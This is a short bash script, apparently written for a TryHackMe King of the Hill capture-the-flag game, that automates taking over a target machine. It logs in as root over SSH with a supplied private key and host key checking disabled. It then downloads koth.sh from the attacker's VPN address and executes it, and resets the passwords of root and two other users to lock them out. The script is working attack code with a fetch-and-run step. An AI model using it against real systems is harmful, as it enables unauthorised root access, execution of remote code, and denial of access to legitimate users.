#!/bin/bash

read -p "Enter the machine IP address: " ip_address
read -p "Enter the id_rsa path: " id_rsa_path
read -p "Your TryHackMe username: " nick
read -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no -i "$id_rsa_path" -p 1337 root@"$ip_address" << EOF

cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
echo "root:$password" | chpasswd
echo "gloria:$password" | chpasswd
echo "marty:$password" | chpasswd

EOF
